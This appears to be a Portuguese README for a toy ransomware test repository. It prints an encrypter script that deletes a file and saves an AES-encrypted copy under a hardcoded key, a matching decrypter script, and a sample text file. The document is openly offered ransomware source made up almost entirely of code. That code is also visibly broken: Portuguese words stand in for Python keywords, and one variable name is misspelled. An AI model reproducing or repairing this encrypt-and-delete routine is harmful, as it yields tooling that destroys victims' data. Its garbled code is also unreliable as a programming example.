# ransomwareteste
Teste de um ataque Ransomware

DECRYPTER.PY

import os
importar pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descritografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## removedor do arquivo criptografado
os.remove(file_name)

## criar o arquivo descrito
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()


ENCRYPTER.PY
import os
importar pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open (file_name, "rb")
file_data = file.read()
file.close()

## removedor de arquivo
os.remover (file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(cripto_data)
new_file.close()


TESTE.TXT

Alo Brasil, vamos avanti sempre
